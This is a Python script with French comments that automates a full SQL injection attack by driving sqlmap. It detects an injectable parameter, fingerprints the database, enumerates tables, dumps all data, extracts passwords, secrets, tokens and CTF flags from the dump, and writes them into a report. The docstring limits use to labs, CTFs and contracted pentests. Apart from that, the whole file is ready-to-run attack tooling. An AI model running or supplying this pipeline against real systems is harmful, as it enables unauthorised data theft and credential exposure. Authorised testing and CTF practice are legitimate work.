#!/usr/bin/env python3
"""
auto_attack.py -- pipeline d'attaque SQL totalement automatisee.

Usage:
    python3 auto_attack.py "http://127.0.0.1:5500/product?id=1"

Ce script orchestre sqlmap de bout en bout, SANS intervention humaine entre
les etapes (c'est ca, "l'automatisation de l'attaque SQL") :

    1. Detection de la vulnerabilite (familles de techniques)
    2. Fingerprint du SGBD
    3. Enumeration des bases / tables
    4. Dump de toutes les donnees accessibles
    5. Recherche automatique d'un flag / de donnees sensibles dans le dump
    6. Generation d'un rapport Markdown pret a presenter

A n'utiliser que contre une cible qu'on possede ou qu'on est explicitement
autorise a tester (labo local, CTF, pentest sous contrat).
"""
import csv
import glob
import os
import re
import subprocess
import sys
import time
import json
from pathlib import Path

FLAG_PATTERN = re.compile(r"[A-Za-z0-9_]{2,10}\{[^{}]{4,200}\}")
SENSITIVE_COLUMN_HINTS = {"password", "passwd", "pwd", "secret", "token", "api_key", "note", "flag"}


def run_sqlmap(args, outdir):
    cmd = ["sqlmap"] + args + ["--batch", "-o", "--output-dir", str(outdir)]
    print(f"\n$ {' '.join(cmd)}")
    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    return proc.stdout + proc.stderr


def extract_techniques(log_text):
    techs = []
    for line in log_text.splitlines():
        if "appears to be" in line and "injectable" in line:
            m = re.search(r"'([^']+)' injectable", line)
            if m:
                techs.append(m.group(1))
        elif "parameter" in line and " is " in line and "injectable" in line and "'" in line:
            m = re.search(r"is '([^']+)' injectable", line)
            if m:
                techs.append(m.group(1))
    seen = set()
    unique = []
    for t in techs:
        if t not in seen:
            seen.add(t)
            unique.append(t)
    return unique


def extract_dbms(log_text):
    m = re.search(r"back-end DBMS:\s*(.+)", log_text)
    return m.group(1).strip() if m else "inconnu"


def find_dump_csvs(outdir):
    return glob.glob(str(outdir / "**" / "dump" / "**" / "*.csv"), recursive=True)


def scan_csv_for_findings(csv_path):
    findings = []
    try:
        with open(csv_path, newline="", encoding="utf-8", errors="replace") as f:
            reader = csv.DictReader(f, delimiter=",")
            if reader.fieldnames is None:
                return findings
            sensitive_cols = [c for c in reader.fieldnames if c.lower() in SENSITIVE_COLUMN_HINTS]
            rows = list(reader)
            for row in rows:
                for col in sensitive_cols:
                    val = row.get(col, "")
                    if val:
                        findings.append({"table": Path(csv_path).stem, "column": col, "value": val})
                for col, val in row.items():
                    if val and FLAG_PATTERN.search(str(val)):
                        for match in FLAG_PATTERN.findall(str(val)):
                            findings.append({"table": Path(csv_path).stem, "column": col, "flag": match})
    except Exception as e:
        print(f"  [!] erreur lecture {csv_path}: {e}")
    return findings


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 auto_attack.py <URL_avec_parametre_vulnerable>")
        sys.exit(1)

    target = sys.argv[1]
    run_id = int(time.time())
    outdir = Path("sqlmap-output") / f"auto-{run_id}"
    outdir.mkdir(parents=True, exist_ok=True)

    report = {
        "target": target,
        "started_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "steps": [],
    }

    print("=" * 70)
    print(" PIPELINE D'ATTAQUE SQL AUTOMATISEE")
    print("=" * 70)
    print(f"Cible : {target}")

    print("\n[1/4] Detection + fingerprint...")
    log1 = run_sqlmap(["-u", target, "--level=3", "--risk=2", "--banner"], outdir)
    techniques = extract_techniques(log1)
    dbms = extract_dbms(log1)
    report["steps"].append({"name": "detection", "techniques": techniques, "dbms": dbms})
    print(f"  -> DBMS: {dbms}")
    print(f"  -> Techniques confirmees: {len(techniques)}")
    for t in techniques:
        print(f"     - {t}")

    print("\n[2/4] Enumeration des tables...")
    log2 = run_sqlmap(["-u", target, "--tables"], outdir)
    tables = []
    in_block = False
    for line in log2.splitlines():
        stripped = line.strip()
        if re.match(r"^\[\d+ tables?\]$", stripped):
            in_block = True
            continue
        if in_block:
            if stripped.startswith("+--"):
                continue
            if stripped.startswith("|"):
                name = stripped.strip("|").strip()
                if name:
                    tables.append(name)
            elif stripped == "":
                in_block = False
    report["steps"].append({"name": "enumeration", "tables": tables})
    print(f"  -> {len(tables)} table(s) trouvee(s): {', '.join(tables) if tables else '(aucune)'}")

    print("\n[3/4] Dump complet de toutes les tables...")
    run_sqlmap(["-u", target, "--dump-all"], outdir)

    print("\n[4/4] Analyse automatique du dump (recherche de flags / donnees sensibles)...")
    csvs = find_dump_csvs(outdir)
    all_findings = []
    for c in csvs:
        all_findings.extend(scan_csv_for_findings(c))
    report["steps"].append({"name": "analyse", "csv_files": len(csvs), "findings": all_findings})

    flags = [f["flag"] for f in all_findings if "flag" in f]
    secrets = [f for f in all_findings if "flag" not in f]

    print(f"  -> {len(csvs)} table(s) dumpee(s) en CSV")
    if flags:
        print(f"  -> {len(set(flags))} flag(s) detecte(s) automatiquement :")
        for fl in set(flags):
            print(f"     *** {fl} ***")
    if secrets:
        print(f"  -> {len(secrets)} valeur(s) sensible(s) (colonnes password/secret/token...) :")
        for s in secrets[:10]:
            print(f"     - {s['table']}.{s['column']} = {s['value']}")

    report["finished_at"] = time.strftime("%Y-%m-%d %H:%M:%S")

    report_path = outdir / "report.md"
    with open(report_path, "w", encoding="utf-8") as f:
        f.write(f"# Rapport d'attaque SQL automatisee\n\n")
        f.write(f"- **Cible** : `{target}`\n")
        f.write(f"- **Debut** : {report['started_at']}\n")
        f.write(f"- **Fin** : {report['finished_at']}\n")
        f.write(f"- **SGBD detecte** : {dbms}\n\n")
        f.write(f"## Techniques d'injection confirmees ({len(techniques)})\n\n")
        for t in techniques:
            f.write(f"- {t}\n")
        f.write(f"\n## Tables decouvertes ({len(tables)})\n\n")
        for t in tables:
            f.write(f"- `{t}`\n")
        f.write(f"\n## Donnees sensibles extraites\n\n")
        if secrets:
            f.write("| Table | Colonne | Valeur |\n|---|---|---|\n")
            for s in secrets:
                f.write(f"| {s['table']} | {s['column']} | {s['value']} |\n")
        else:
            f.write("_Aucune colonne sensible identifiee automatiquement._\n")
        f.write(f"\n## Flags detectes\n\n")
        if flags:
            for fl in set(flags):
                f.write(f"- `{fl}`\n")
        else:
            f.write("_Aucun flag trouve dans le dump._\n")

    with open(outdir / "report.json", "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)

    print("\n" + "=" * 70)
    print(f" TERMINE. Rapport : {report_path}")
    print("=" * 70)


if __name__ == "__main__":
    main()
